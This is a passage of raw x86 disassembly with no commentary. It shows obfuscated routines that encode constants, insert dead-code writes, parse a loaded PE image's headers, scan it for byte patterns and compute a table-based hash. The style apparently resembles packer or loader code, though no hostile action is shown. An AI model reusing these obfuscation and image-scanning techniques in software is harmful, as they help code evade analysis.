  42706a:	mov    ecx,DWORD PTR [ebp-0x8]
  42706d:	xor    eax,esi
  42706f:	xor    ecx,esi
  427071:	add    eax,edi
  427073:	add    ecx,edi
  427075:	cmp    eax,ecx
  427077:	jae    0x4270bf
  427079:	lea    ecx,[eax-0x3272f6]
  42707f:	mov    DWORD PTR [ebp-0x4],ecx
  427082:	mov    ebx,DWORD PTR [ebp-0x4]
  427085:	xor    ebx,esi
  427087:	add    ebx,0x7f55d8e3
  42708d:	lea    ecx,[ebp+eax*4-0x38]
  427091:	mov    DWORD PTR [ecx],ebx
  427093:	mov    ebx,DWORD PTR [ecx]
  427095:	cmp    ebx,0x244ecb82
  42709b:	jbe    0x4270a5
  42709d:	add    DWORD PTR [ecx],0x405fcc1
  4270a3:	jmp    0x4270ab
  4270a5:	add    DWORD PTR [ecx],0xfdaf433f
  4270ab:	mov    ecx,DWORD PTR [ebp-0x8]
  4270ae:	xor    ecx,esi
  4270b0:	inc    eax
  4270b1:	inc    DWORD PTR [ebp-0x4]
  4270b4:	add    ecx,edi
  4270b6:	cmp    eax,ecx
  4270b8:	jb     0x427082
  4270ba:	mov    ebx,0xf89c85a5
  4270bf:	cmp    DWORD PTR [ebp-0x14],0x0
  4270c3:	jne    0x4270cd
  4270c5:	xor    dl,0x7f
  4270c8:	add    dl,0x4
  4270cb:	jmp    0x4270e3
  4270cd:	mov    eax,DWORD PTR [ebp-0x18]
  4270d0:	xor    al,0xaf
  4270d2:	mov    cl,0xa
  4270d4:	sub    cl,al
  4270d6:	add    dl,cl
  4270d8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4270db:	xor    cl,0xaf
  4270de:	sub    cl,0xa
  4270e1:	ror    dl,cl
  4270e3:	xor    eax,eax
  4270e5:	mov    eax,DWORD PTR [ebp+0x8]
  4270e8:	mov    ecx,DWORD PTR [ebp-0xc]
  4270eb:	mov    BYTE PTR [eax+ecx*1],dl
  4270ee:	mov    eax,DWORD PTR [ebp+0x8]
  4270f1:	mov    ecx,DWORD PTR [ebp-0x10]
  4270f4:	sub    eax,edi
  4270f6:	xor    eax,esi
  4270f8:	cmp    eax,ecx
  4270fa:	jne    0x42711d
  4270fc:	mov    eax,DWORD PTR [ebp+0x10]
  4270ff:	mov    ecx,DWORD PTR [ebp+0xc]
  427102:	xor    eax,esi
  427104:	xor    ecx,esi
  427106:	sub    eax,ecx
  427108:	mov    ecx,DWORD PTR [ebp-0x20]
  42710b:	sub    eax,edi
  42710d:	xor    eax,esi
  42710f:	mov    DWORD PTR [ebp+0x10],eax
  427112:	mov    eax,DWORD PTR [ebp+0xc]
  427115:	xor    eax,esi
  427117:	sub    ecx,eax
  427119:	sub    ecx,edi
  42711b:	jmp    0x42712c
  42711d:	mov    eax,DWORD PTR [ebp+0xc]
  427120:	xor    eax,esi
  427122:	mov    ecx,0xffcd8d0a
  427127:	sub    ecx,eax
  427129:	add    ecx,DWORD PTR [ebp+0x8]
  42712c:	mov    DWORD PTR [ebp+0x8],ecx
  42712f:	mov    eax,DWORD PTR [ebp+0x10]
  427132:	cmp    eax,ebx
  427134:	jne    0x427032
  42713a:	mov    eax,DWORD PTR [ebp-0x24]
  42713d:	jmp    0x427142
  42713f:	mov    eax,DWORD PTR [ebp-0x4]
  427142:	xor    eax,esi
  427144:	add    eax,edi
  427146:	pop    edi
  427147:	pop    esi
  427148:	pop    ebx
  427149:	leave  
  42714a:	ret    0xc
  42714d:	push   ebp
  42714e:	mov    ebp,esp
  427150:	sub    esp,0x420
  427156:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  42715d:	mov    DWORD PTR [ebp-0xc],0xf89c85a4
  427164:	mov    DWORD PTR [ebp-0x18],0xf89c86a5
  42716b:	push   ebx
  42716c:	mov    DWORD PTR [ebp-0x1c],0xf89c85a6
  427173:	mov    eax,DWORD PTR [ebp-0x14]
  427176:	push   esi
  427177:	mov    esi,0x75108af
  42717c:	push   edi
  42717d:	xor    eax,esi
  42717f:	mov    edi,0x3272f6
  427184:	add    eax,edi
  427186:	mov    DWORD PTR [ebp-0x8],eax
  427189:	mov    DWORD PTR [ebp-0x20],0xf89c85bd
  427190:	mov    DWORD PTR [ebp-0x4],0xead71885
  427197:	mov    DWORD PTR [ebp-0x10],0x8
  42719e:	mov    ecx,ecx
  4271a0:	mov    eax,DWORD PTR [ebp-0xc]
  4271a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4271a6:	xor    eax,esi
  4271a8:	xor    ecx,esi
  4271aa:	add    eax,edi
  4271ac:	add    ecx,edi
  4271ae:	imul   eax,ecx
  4271b1:	jmp    0x4271e4
  4271b3:	mov    eax,DWORD PTR [ebp-0x4]
  4271b6:	sub    eax,edi
  4271b8:	xor    eax,esi
  4271ba:	mov    DWORD PTR [ebp-0x8],eax
  4271bd:	lea    ebx,[ebp-0x8]
  4271c0:	call   0x426f05
  4271c5:	mov    DWORD PTR [ebp-0x8],eax
  4271c8:	mov    eax,DWORD PTR [ebp-0x8]
  4271cb:	mov    ecx,DWORD PTR [ebp-0x4]
  4271ce:	mov    DWORD PTR [ebp+ecx*4-0x420],eax
  4271d5:	mov    eax,DWORD PTR [ebp-0xc]
  4271d8:	mov    ecx,DWORD PTR [ebp-0x4]
  4271db:	xor    eax,esi
  4271dd:	lea    eax,[eax+ecx*1+0x3272f6]
  4271e4:	mov    DWORD PTR [ebp-0x4],eax
  4271e7:	mov    eax,DWORD PTR [ebp-0x18]
  4271ea:	mov    ecx,DWORD PTR [ebp-0xc]
  4271ed:	xor    ecx,esi
  4271ef:	xor    eax,esi
  4271f1:	sub    eax,ecx
  4271f3:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f6:	cmp    ecx,eax
  4271f8:	jbe    0x4271b3
  4271fa:	mov    eax,DWORD PTR [ebp-0x1c]
  4271fd:	xor    eax,esi
  4271ff:	add    eax,edi
  427201:	mov    DWORD PTR [ebp-0x8],eax
  427204:	mov    DWORD PTR [ebp-0x18],0xf89c86a6
  42720b:	mov    ebx,ebx
  42720d:	jmp    0x427270
  42720f:	mov    ecx,DWORD PTR [ebp-0x20]
  427212:	mov    eax,DWORD PTR [ebp-0x8]
  427215:	xor    ecx,esi
  427217:	add    ecx,edi
  427219:	shr    eax,cl
  42721b:	mov    DWORD PTR [ebp-0x4],eax
  42721e:	mov    eax,DWORD PTR [ebp+0x8]
  427221:	mov    cl,BYTE PTR [eax]
  427223:	mov    BYTE PTR [ebp+0xb],cl
  427226:	mov    cl,BYTE PTR [ebp+0xb]
  427229:	mov    edx,DWORD PTR [ebp-0x8]
  42722c:	movzx  ecx,cl
  42722f:	xor    ecx,edx
  427231:	mov    DWORD PTR [ebp+0x8],ecx
  427234:	mov    ecx,DWORD PTR [ebp-0x18]
  427237:	mov    edx,DWORD PTR [ebp+0x8]
  42723a:	xor    ecx,esi
  42723c:	add    ecx,edi
  42723e:	and    ecx,edx
  427240:	mov    ecx,DWORD PTR [ebp+ecx*4-0x420]
  427247:	mov    edx,DWORD PTR [ebp-0x4]
  42724a:	xor    ecx,edx
  42724c:	mov    DWORD PTR [ebp-0x8],ecx
  42724f:	mov    ecx,DWORD PTR [ebp-0xc]
  427252:	xor    ecx,esi
  427254:	lea    eax,[eax+ecx*1+0x3272f6]
  42725b:	mov    DWORD PTR [ebp+0x8],eax
  42725e:	mov    eax,DWORD PTR [ebp-0xc]
  427261:	xor    eax,esi
  427263:	mov    ecx,0xffcd8d0a
  427268:	sub    ecx,eax
  42726a:	add    ecx,DWORD PTR [ebp-0x10]
  42726d:	mov    DWORD PTR [ebp-0x10],ecx
  427270:	mov    eax,DWORD PTR [ebp-0x14]
  427273:	mov    ecx,DWORD PTR [ebp-0x10]
  427276:	xor    eax,esi
  427278:	add    eax,edi
  42727a:	cmp    ecx,eax
  42727c:	jne    0x42720f
  42727e:	mov    eax,DWORD PTR [ebp-0x1c]
  427281:	mov    ecx,DWORD PTR [ebp-0x8]
  427284:	xor    eax,esi
  427286:	add    eax,edi
  427288:	pop    edi
  427289:	pop    esi
  42728a:	xor    eax,ecx
  42728c:	pop    ebx
  42728d:	leave  
  42728e:	ret    0x4
  427291:	push   ebp
  427292:	mov    ebp,esp
  427294:	mov    eax,DWORD PTR [ebp+0x1c]
  427297:	mov    ecx,DWORD PTR [ebp+0x8]
  42729a:	mov    edx,DWORD PTR [ebp+0x10]
  42729d:	mov    eax,DWORD PTR [eax+0x190]
  4272a3:	mov    eax,DWORD PTR [eax]
  4272a5:	sub    esp,0x64
  4272a8:	push   ebx
  4272a9:	push   esi
  4272aa:	push   edi
  4272ab:	mov    edi,0x75108af
  4272b0:	xor    ecx,edi
  4272b2:	mov    ebx,0x3272f6
  4272b7:	add    ecx,ebx
  4272b9:	cmp    ecx,edx
  4272bb:	jne    0x4272cc
  4272bd:	or     DWORD PTR ds:0x3750c3f,0x4263eb2e
  4272c7:	jmp    0x4277c8
  4272cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4272cf:	mov    esi,DWORD PTR [ebp+0x14]
  4272d2:	mov    edx,DWORD PTR [esi]
  4272d4:	xor    ecx,edi
  4272d6:	add    ecx,ebx
  4272d8:	cmp    edx,ecx
  4272da:	je     0x427783
  4272e0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4272e3:	mov    DWORD PTR [ebp-0x1c],eax
  4272e6:	mov    DWORD PTR [ebp+0x1c],ecx
  4272e9:	mov    ecx,DWORD PTR [ebp+0x18]
  4272ec:	mov    eax,DWORD PTR [esi]
  4272ee:	mov    DWORD PTR [ebp-0x20],eax
  4272f1:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4272f8:	mov    edx,0xf89c85a4
  4272fd:	mov    DWORD PTR [ebp-0x8],edx
  427300:	mov    eax,DWORD PTR [ebp+0x1c]
  427303:	mov    DWORD PTR [ebp+0x1c],eax
  427306:	mov    eax,DWORD PTR [ebp+0x1c]
  427309:	mov    eax,DWORD PTR [eax+0x190]
  42730f:	mov    eax,DWORD PTR [eax]
  427311:	mov    DWORD PTR [ebp-0x24],ecx
  427314:	mov    ecx,DWORD PTR [ebp+0x1c]
  427317:	mov    ecx,DWORD PTR [ecx+0x190]
  42731d:	mov    ecx,DWORD PTR [ecx]
  42731f:	add    ecx,DWORD PTR [eax+0x3c]
  427322:	mov    DWORD PTR [ebp+0x10],ecx
  427325:	mov    eax,DWORD PTR [ebp+0x8]
  427328:	xor    eax,edi
  42732a:	add    eax,ebx
  42732c:	mov    DWORD PTR [ebp-0x4],eax
  42732f:	mov    eax,DWORD PTR [ebp+0x8]
  427332:	xor    eax,edi
  427334:	add    eax,ebx
  427336:	mov    DWORD PTR [ebp+0x18],eax
  427339:	mov    eax,DWORD PTR [ebp+0x10]
  42733c:	mov    eax,DWORD PTR [eax+0x50]
  42733f:	sub    eax,0xc
  427342:	mov    DWORD PTR [ebp-0x28],eax
  427345:	mov    eax,DWORD PTR [ebp+0x10]
  427348:	mov    eax,DWORD PTR [eax+0x38]
  42734b:	mov    ecx,DWORD PTR [ebp+0x10]
  42734e:	dec    eax
  42734f:	test   DWORD PTR [ecx+0x54],eax
  427352:	mov    eax,DWORD PTR [ebp+0x10]
  427355:	je     0x42736f
  427357:	mov    eax,DWORD PTR [eax+0x38]
  42735a:	mov    ecx,DWORD PTR [ebp+0x10]
  42735d:	mov    ecx,DWORD PTR [ecx+0x54]
  427360:	dec    eax
  427361:	not    eax
  427363:	and    ecx,eax
  427365:	mov    eax,DWORD PTR [ebp+0x10]
  427368:	mov    eax,DWORD PTR [eax+0x38]
  42736b:	add    eax,ecx
  42736d:	jmp    0x427372
  42736f:	mov    eax,DWORD PTR [eax+0x54]
  427372:	mov    DWORD PTR [ebp+0x1c],eax
  427375:	mov    eax,DWORD PTR [ebp+0x8]
  427378:	xor    eax,edi
  42737a:	add    eax,ebx
  42737c:	mov    DWORD PTR [ebp+0x18],eax
  42737f:	mov    eax,DWORD PTR [ebp+0x8]
  427382:	xor    eax,edi
  427384:	add    eax,ebx
  427386:	mov    DWORD PTR [ebp+0x18],eax
  427389:	mov    eax,DWORD PTR [ebp+0x8]
  42738c:	mov    ecx,DWORD PTR [ebp-0x24]
  42738f:	xor    eax,edi
  427391:	add    eax,ebx
  427393:	mov    DWORD PTR [ecx],eax
  427395:	mov    DWORD PTR [ebp+0x18],edx
  427398:	mov    DWORD PTR [ebp+0x18],0xf89c85a3
  42739f:	mov    DWORD PTR [ebp+0x18],0xf89c85a2
  4273a6:	mov    DWORD PTR [ebp+0x18],0xf89c85a1
  4273ad:	mov    eax,DWORD PTR [ebp-0x8]
  4273b0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4273b3:	xor    eax,edi
  4273b5:	add    eax,ebx
  4273b7:	imul   eax,ecx
  4273ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4273bd:	mov    edx,DWORD PTR [ebp-0x28]
  4273c0:	xor    ecx,edi
  4273c2:	lea    ecx,[ecx+edx*1+0x3272f6]
  4273c9:	cmp    eax,ecx
  4273cb:	jae    0x42777c
  4273d1:	mov    eax,DWORD PTR [ebp+0x8]
  4273d4:	xor    eax,edi
  4273d6:	add    eax,ebx
  4273d8:	mov    DWORD PTR [ebp+0x18],eax
  4273db:	mov    eax,DWORD PTR [ebp+0x1c]
  4273de:	add    eax,DWORD PTR [ebp-0x1c]
  4273e1:	mov    DWORD PTR [ebp-0x4],eax
  4273e4:	push   DWORD PTR [ebp-0x4]
  4273e7:	mov    esi,DWORD PTR [ebp-0x1c]
  4273ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4273ed:	call   0x42653d
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  4273fc:	mov    eax,DWORD PTR [ebp-0x18]
  4273ff:	xor    eax,edi
  427401:	lea    ecx,[ebp-0x40]
  427404:	add    eax,ebx
  427406:	push   ecx
  427407:	call   0x426ad1
  42740c:	mov    eax,DWORD PTR [ebp+0xc]
  42740f:	test   eax,eax
  427411:	je     0x427461
  427413:	mov    eax,DWORD PTR [ebp-0x18]
  427416:	xor    eax,edi
  427418:	add    eax,ebx
  42741a:	push   eax
  42741b:	push   DWORD PTR [ebp+0xc]
  42741e:	lea    eax,[ebp-0x40]
  427421:	push   eax
  427422:	call   0x4269c7
  427427:	mov    eax,DWORD PTR [ebp-0x4]
  42742a:	mov    DWORD PTR [ebp-0x18],eax
  42742d:	mov    eax,DWORD PTR [ebp-0x18]
  427430:	mov    ecx,DWORD PTR [ebp-0x1c]
  427433:	sub    eax,ecx
  427435:	mov    DWORD PTR [ebp-0x18],eax
  427438:	mov    eax,DWORD PTR [ebp+0xc]
  42743b:	mov    ecx,DWORD PTR [ebp+0xc]
  42743e:	mov    eax,DWORD PTR [eax+0x10]
  427441:	add    eax,DWORD PTR [ecx+0xc]
  427444:	mov    ecx,DWORD PTR [ebp-0x18]
  427447:	cmp    ecx,eax
  427449:	jb     0x427461
  42744b:	mov    eax,DWORD PTR [ebp+0xc]
  42744e:	mov    eax,DWORD PTR [eax+0xc]
  427451:	mov    ecx,DWORD PTR [ebp+0xc]
  427454:	add    eax,DWORD PTR [ecx+0x8]
  427457:	mov    ecx,DWORD PTR [ebp-0x18]
  42745a:	sub    eax,ecx
  42745c:	jmp    0x42774f
  427461:	push   0xc
  427463:	push   DWORD PTR [ebp-0x4]
  427466:	lea    eax,[ebp-0x4c]
  427469:	push   eax
  42746a:	call   0x4269c7
  42746f:	mov    eax,0xf89c85a5
  427474:	mov    DWORD PTR [ebp-0x2c],eax
  427477:	mov    DWORD PTR [ebp-0x30],0xf89c85a4
  42747e:	mov    DWORD PTR [ebp-0x34],0xf89c85a3
  427485:	mov    DWORD PTR [ebp-0x38],0xf89c85a2
  42748c:	lea    ecx,[ebp-0x2c]
  42748f:	mov    DWORD PTR [ebp-0xc],ecx
  427492:	lea    ecx,[ebp-0x30]
  427495:	mov    DWORD PTR [ebp-0x10],ecx
  427498:	lea    ecx,[ebp-0x34]
  42749b:	mov    DWORD PTR [ebp+0xc],ecx
  42749e:	lea    ecx,[ebp-0x38]
  4274a1:	mov    DWORD PTR [ebp-0x14],ecx
  4274a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4274a7:	xor    ecx,edi
  4274a9:	add    ecx,ebx
  4274ab:	mov    DWORD PTR [ebp-0x18],ecx
  4274ae:	jmp    0x4276aa
  4274b3:	cmp    eax,0xf89c85a3
  4274b8:	je     0x4276bc
  4274be:	mov    ecx,DWORD PTR [ebp-0x8]
  4274c1:	xor    ecx,edi
  4274c3:	mov    esi,eax
  4274c5:	add    ecx,ebx
  4274c7:	mov    DWORD PTR [ebp+0x18],ecx
  4274ca:	mov    eax,DWORD PTR [ebp-0x18]
  4274cd:	xor    esi,edi
  4274cf:	lea    eax,[eax+esi*1+0x3272f6]
  4274d6:	mov    DWORD PTR [ebp-0x18],eax
  4274d9:	mov    eax,DWORD PTR [ebp-0x8]
  4274dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4274df:	xor    eax,edi
  4274e1:	add    eax,ebx
  4274e3:	cmp    ecx,eax
  4274e5:	jne    0x4274fa
  4274e7:	mov    eax,DWORD PTR [ebp+0x8]
  4274ea:	xor    eax,edi
  4274ec:	add    eax,ebx
  4274ee:	push   eax
  4274ef:	push   0xc
  4274f1:	lea    eax,[ebp-0x4c]
  4274f4:	push   eax
  4274f5:	call   0x426fad
  4274fa:	mov    eax,DWORD PTR [ebp-0xc]
  4274fd:	mov    eax,DWORD PTR [eax]
  4274ff:	xor    eax,edi
  427501:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427508:	mov    ecx,DWORD PTR [ebp+0x8]
  42750b:	xor    ecx,edi
  42750d:	movzx  eax,al
  427510:	add    ecx,ebx
  427512:	cmp    eax,ecx
  427514:	je     0x427692
  42751a:	mov    eax,DWORD PTR [ebp-0x10]
  42751d:	mov    eax,DWORD PTR [eax]
  42751f:	xor    eax,edi
  427521:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427528:	mov    ecx,DWORD PTR [ebp+0x8]
  42752b:	xor    ecx,edi
  42752d:	movzx  eax,al
  427530:	add    ecx,ebx
  427532:	cmp    eax,ecx
  427534:	je     0x427692
  42753a:	mov    eax,DWORD PTR [ebp+0xc]
  42753d:	mov    eax,DWORD PTR [eax]
  42753f:	xor    eax,edi
  427541:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427548:	mov    ecx,DWORD PTR [ebp+0x8]
  42754b:	xor    ecx,edi
  42754d:	movzx  eax,al
  427550:	add    ecx,ebx
  427552:	cmp    eax,ecx
  427554:	je     0x427692
  42755a:	mov    eax,DWORD PTR [ebp-0x14]
  42755d:	mov    eax,DWORD PTR [eax]
  42755f:	xor    eax,edi
  427561:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427568:	mov    ecx,DWORD PTR [ebp+0x8]
  42756b:	xor    ecx,edi
  42756d:	movzx  eax,al
  427570:	add    ecx,ebx
  427572:	cmp    eax,ecx
  427574:	je     0x427692
  42757a:	mov    eax,DWORD PTR [ebp-0x10]
  42757d:	mov    eax,DWORD PTR [eax]
  42757f:	xor    eax,edi
  427581:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427588:	mov    ecx,DWORD PTR [ebp-0xc]
  42758b:	mov    ecx,DWORD PTR [ecx]
  42758d:	xor    ecx,edi
  42758f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  427596:	xor    al,cl
  427598:	mov    ecx,DWORD PTR [ebp+0xc]
  42759b:	mov    ecx,DWORD PTR [ecx]
  42759d:	xor    ecx,edi
  42759f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275a6:	or     al,cl
  4275a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4275ab:	mov    ecx,DWORD PTR [ecx]
  4275ad:	xor    ecx,edi
  4275af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275b6:	cmp    cl,al
  4275b8:	jne    0x427692
  4275be:	mov    eax,DWORD PTR [ebp+0xc]
  4275c1:	mov    eax,DWORD PTR [eax]
  4275c3:	xor    eax,edi
  4275c5:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  4275cc:	mov    ecx,DWORD PTR [ebp-0x10]
  4275cf:	mov    ecx,DWORD PTR [ecx]
  4275d1:	xor    ecx,edi
  4275d3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275da:	xor    al,cl
  4275dc:	mov    ecx,DWORD PTR [ebp-0x14]
  4275df:	mov    ecx,DWORD PTR [ecx]
  4275e1:	xor    ecx,edi
  4275e3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  4275ea:	or     al,cl
  4275ec:	mov    ecx,DWORD PTR [ebp-0x10]
  4275ef:	mov    ecx,DWORD PTR [ecx]
  4275f1:	xor    ecx,edi
  4275f3:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4275fa:	cmp    cl,al
  4275fc:	jne    0x427692
  427602:	mov    eax,DWORD PTR [ebp-0x14]
  427605:	mov    eax,DWORD PTR [eax]
  427607:	xor    eax,edi
  427609:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427610:	mov    ecx,DWORD PTR [ebp+0xc]
  427613:	mov    ecx,DWORD PTR [ecx]
  427615:	xor    ecx,edi
  427617:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42761e:	xor    al,cl
  427620:	mov    ecx,DWORD PTR [ebp-0xc]
  427623:	mov    ecx,DWORD PTR [ecx]
  427625:	xor    ecx,edi
  427627:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42762e:	or     al,cl
  427630:	mov    ecx,DWORD PTR [ebp+0xc]
  427633:	mov    ecx,DWORD PTR [ecx]
  427635:	xor    ecx,edi
  427637:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42763e:	cmp    cl,al
  427640:	jne    0x427692
  427642:	mov    eax,DWORD PTR [ebp-0x14]
  427645:	mov    eax,DWORD PTR [eax]
  427647:	xor    eax,edi
  427649:	mov    al,BYTE PTR [ebp+eax*1+0x3272aa]
  427650:	mov    ecx,DWORD PTR [ebp-0xc]
  427653:	mov    ecx,DWORD PTR [ecx]
  427655:	xor    ecx,edi
  427657:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42765e:	xor    al,cl
  427660:	mov    ecx,DWORD PTR [ebp-0x10]
  427663:	mov    ecx,DWORD PTR [ecx]
  427665:	xor    ecx,edi
  427667:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272aa]
  42766e:	or     al,cl
  427670:	mov    ecx,DWORD PTR [ebp-0x14]
  427673:	mov    ecx,DWORD PTR [ecx]
  427675:	xor    ecx,edi
  427677:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  42767e:	cmp    cl,al
  427680:	jne    0x427692
  427682:	lea    eax,[ebp-0x4c]
  427685:	push   eax
  427686:	call   0x42714d
  42768b:	mov    ecx,DWORD PTR [ebp-0x44]
  42768e:	cmp    eax,ecx
  427690:	je     0x42769c
  427692:	mov    eax,DWORD PTR [ebp+0x8]
  427695:	xor    eax,edi
  427697:	add    eax,ebx
  427699:	mov    DWORD PTR [ebp+0x18],eax
  42769c:	mov    eax,DWORD PTR [ebp-0x8]
  42769f:	xor    eax,edi
  4276a1:	lea    eax,[eax+esi*1+0x3272f6]
  4276a8:	xor    eax,edi
  4276aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4276ad:	mov    edx,DWORD PTR [ebp+0x18]
  4276b0:	xor    ecx,edi
  4276b2:	add    ecx,ebx
  4276b4:	cmp    edx,ecx
  4276b6:	je     0x4274b3
  4276bc:	mov    eax,DWORD PTR [ebp+0x8]
  4276bf:	mov    ecx,DWORD PTR [ebp+0x18]
  4276c2:	xor    eax,edi
  4276c4:	add    eax,ebx
  4276c6:	cmp    ecx,eax
  4276c8:	jne    0x4276db
  4276ca:	mov    eax,DWORD PTR [ebp-0x8]
  4276cd:	mov    ecx,DWORD PTR [ebp+0x1c]
  4276d0:	xor    eax,edi
  4276d2:	lea    eax,[eax+ecx*1+0x3272f6]
  4276d9:	jmp    0x427752
  4276db:	push   0x18
  4276dd:	push   DWORD PTR [ebp-0x4]
  4276e0:	lea    eax,[ebp-0x64]
  4276e3:	push   eax
  4276e4:	call   0x4269c7
  4276e9:	mov    eax,DWORD PTR [ebp+0x8]
  4276ec:	mov    ecx,DWORD PTR [ebp-0x18]
  4276ef:	xor    eax,edi
  4276f1:	add    eax,ebx
  4276f3:	cmp    eax,ecx
  4276f5:	je     0x42770a
  4276f7:	mov    eax,DWORD PTR [ebp+0x8]
  4276fa:	xor    eax,edi
  4276fc:	add    eax,ebx
  4276fe:	push   eax
  4276ff:	push   0x18
  427701:	lea    eax,[ebp-0x64]
  427704:	push   eax
  427705:	call   0x426fad
  42770a:	mov    eax,DWORD PTR [ebp-0x4]
  42770d:	add    eax,0x18
  427710:	mov    DWORD PTR [ebp+0x18],eax
  427713:	push   DWORD PTR [ebp-0x50]
  427716:	push   DWORD PTR [ebp+0x18]
  427719:	mov    eax,DWORD PTR [ebp-0x54]
  42771c:	add    eax,DWORD PTR [ebp-0x20]
  42771f:	push   eax
  427720:	call   0x4269c7
  427725:	mov    eax,DWORD PTR [ebp+0x8]
  427728:	mov    ecx,DWORD PTR [ebp-0x18]
  42772b:	xor    eax,edi
  42772d:	add    eax,ebx
  42772f:	cmp    eax,ecx
  427731:	je     0x427744
  427733:	push   0x0
  427735:	push   DWORD PTR [ebp-0x50]
  427738:	mov    eax,DWORD PTR [ebp-0x54]
  42773b:	add    eax,DWORD PTR [ebp-0x20]
  42773e:	push   eax
  42773f:	call   0x426fad
  427744:	mov    eax,DWORD PTR [ebp-0x24]
  427747:	mov    ecx,DWORD PTR [ebp-0x50]
  42774a:	add    DWORD PTR [eax],ecx
  42774c:	mov    eax,DWORD PTR [ebp-0x50]
  42774f:	add    eax,DWORD PTR [ebp+0x1c]
  427752:	mov    DWORD PTR [ebp+0x1c],eax
  427755:	mov    eax,DWORD PTR [ebp-0x8]
  427758:	mov    ecx,DWORD PTR [ebp+0x1c]
  42775b:	xor    eax,edi
  42775d:	add    eax,ebx
  42775f:	imul   eax,ecx
  427762:	mov    ecx,DWORD PTR [ebp+0x8]
  427765:	mov    edx,DWORD PTR [ebp-0x28]
  427768:	xor    ecx,edi
  42776a:	lea    ecx,[ecx+edx*1+0x3272f6]
  427771:	cmp    eax,ecx
  427773:	jb     0x4273d1
  427779:	mov    esi,DWORD PTR [ebp+0x14]
  42777c:	mov    eax,DWORD PTR [ebp-0x20]
  42777f:	mov    DWORD PTR [esi],eax
  427781:	jmp    0x4277c8
  427783:	mov    ecx,DWORD PTR [ebp+0x8]
  427786:	mov    edx,DWORD PTR [ebp+0xc]
  427789:	xor    ecx,edi
  42778b:	xor    edx,edi
  42778d:	add    ecx,ebx
  42778f:	add    edx,ebx
  427791:	cmp    ecx,edx
  427793:	jne    0x4277a7
  427795:	mov    eax,ds:0x7f642dde
  42779a:	imul   eax,eax,0x9f15fccf
  4277a0:	mov    ds:0x7f642dde,eax
  4277a5:	jmp    0x4277c8
  4277a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4277aa:	xor    ecx,edi
  4277ac:	add    ecx,ebx
  4277ae:	cmp    eax,ecx
  4277b0:	je     0x4277be
  4277b2:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  4277bc:	jmp    0x4277c8
  4277be:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  4277c8:	pop    edi
  4277c9:	pop    esi
  4277ca:	pop    ebx
  4277cb:	leave  
  4277cc:	ret    0x18
  4277cf:	push   ebp
  4277d0:	mov    ebp,esp
  4277d2:	and    esp,0xfffffff8
  4277d5:	mov    eax,DWORD PTR [ebp+0x20]
  4277d8:	sub    esp,0x14
  4277db:	push   ebx
  4277dc:	mov    ebx,DWORD PTR [ebp+0x14]
  4277df:	push   esi
  4277e0:	push   edi
  4277e1:	cmp    eax,0xf89c85a5
  4277e6:	jne    0x4277f2
  4277e8:	push   0xf89c85a4
  4277ed:	jmp    0x427924
  4277f2:	mov    eax,DWORD PTR [ebp+0x20]
  4277f5:	cmp    eax,0xf89c85a4
  4277fa:	jne    0x427806
  4277fc:	push   0xf89c85a3
  427801:	jmp    0x427924
  427806:	mov    eax,DWORD PTR [ebp+0x20]
  427809:	cmp    eax,0xf89c85a3
  42780e:	jne    0x42781a
  427810:	push   0xf89c85a2
  427815:	jmp    0x427924
  42781a:	mov    eax,DWORD PTR [ebp+0x20]
  42781d:	cmp    eax,0xf89c85a2
  427822:	jne    0x42782e
  427824:	push   0xf89c85a1
  427829:	jmp    0x427924
  42782e:	mov    ecx,DWORD PTR [ebp+0x20]
  427831:	mov    eax,0xf89c85be
  427836:	cmp    ecx,eax
  427838:	jne    0x4278f4
  42783e:	mov    eax,DWORD PTR [ebp+0x10]
  427841:	mov    DWORD PTR [esp+0xc],eax
  427845:	mov    eax,DWORD PTR [ebp+0x18]
  427848:	mov    DWORD PTR [esp+0x14],eax
  42784c:	mov    eax,DWORD PTR [ebp+0xc]
  42784f:	mov    DWORD PTR [esp+0x18],eax
  427853:	mov    eax,DWORD PTR [ebp+0x8]
  427856:	mov    DWORD PTR [esp+0x10],eax
  42785a:	mov    eax,DWORD PTR [esp+0x10]
  42785e:	mov    ecx,DWORD PTR [esp+0x14]
  427862:	mov    edi,0x75108af
  427867:	xor    eax,edi
  427869:	mov    esi,0x3272f6
  42786e:	add    eax,esi
  427870:	mov    DWORD PTR [ecx],eax
  427872:	mov    eax,DWORD PTR [esp+0xc]
